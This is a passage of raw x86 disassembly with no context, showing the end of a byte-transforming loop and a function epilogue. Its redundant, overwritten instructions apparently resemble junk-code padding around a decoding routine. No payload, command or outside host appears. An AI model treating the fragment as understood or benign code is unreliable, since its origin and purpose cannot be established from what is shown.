  4169ce:	add    ecx,DWORD PTR [ebp-0x4]
  4169d1:	mov    dl,BYTE PTR [ecx+0x1]
  4169d4:	mov    BYTE PTR [ebp-0x11],dl
  4169d7:	mov    eax,DWORD PTR [ebp-0x4]
  4169da:	add    eax,0x1
  4169dd:	mov    DWORD PTR [ebp-0x4],eax
  4169e0:	mov    cl,BYTE PTR [ebp-0x11]
  4169e3:	mov    BYTE PTR [ebp-0x29],cl
  4169e6:	push   edx
  4169e7:	pop    ebx
  4169e8:	mov    ecx,ebx
  4169ea:	mov    edx,DWORD PTR [ebp-0x10]
  4169ed:	add    edx,DWORD PTR [ebp-0x4]
  4169f0:	mov    al,BYTE PTR [ebp-0x29]
  4169f3:	mov    BYTE PTR [edx],al
  4169f5:	mov    ebx,esi
  4169f7:	mov    ecx,DWORD PTR [ebp+0x14]
  4169fa:	add    ecx,DWORD PTR [ebp-0x8]
  4169fd:	movzx  edx,BYTE PTR [ecx]
  416a00:	mov    DWORD PTR [ebp-0xc],edx
  416a03:	mov    eax,DWORD PTR [ebp-0x8]
  416a06:	mov    ecx,DWORD PTR [ebp-0x28]
  416a09:	add    eax,ecx
  416a0b:	mov    DWORD PTR [ebp-0x8],eax
  416a0e:	mov    eax,DWORD PTR [ebp-0x8]
  416a11:	shr    eax,0x3
  416a14:	mov    ecx,0x1
  416a19:	sub    ecx,eax
  416a1b:	mov    DWORD PTR [ebp-0x20],ecx
  416a1e:	shr    eax,cl
  416a20:	mov    edx,DWORD PTR [ebp-0x8]
  416a23:	imul   edx,DWORD PTR [ebp-0x20]
  416a27:	mov    DWORD PTR [ebp-0x8],edx
  416a2a:	shl    ebx,0x3
  416a2d:	mov    eax,DWORD PTR [ebp-0x10]
  416a30:	add    eax,DWORD PTR [ebp-0x4]
  416a33:	movzx  ecx,BYTE PTR [eax]
  416a36:	add    ecx,DWORD PTR [ebp-0xc]
  416a39:	mov    edx,DWORD PTR [ebp-0x10]
  416a3c:	add    edx,DWORD PTR [ebp-0x4]
  416a3f:	mov    BYTE PTR [edx],cl
  416a41:	mov    eax,DWORD PTR [ebp-0x4]
  416a44:	sub    eax,0x2
  416a47:	mov    DWORD PTR [ebp-0x4],eax
  416a4a:	mov    ecx,DWORD PTR [ebp-0x4]
  416a4d:	cmp    ecx,DWORD PTR [ebp+0x10]
  416a50:	jl     0x4169c2
  416a56:	pop    ebx
  416a57:	mov    esp,ebp
  416a59:	pop    ebp
  416a5a:	ret    
  416a5b:	int3   
  416a5c:	jmp    DWORD PTR ds:0x417008
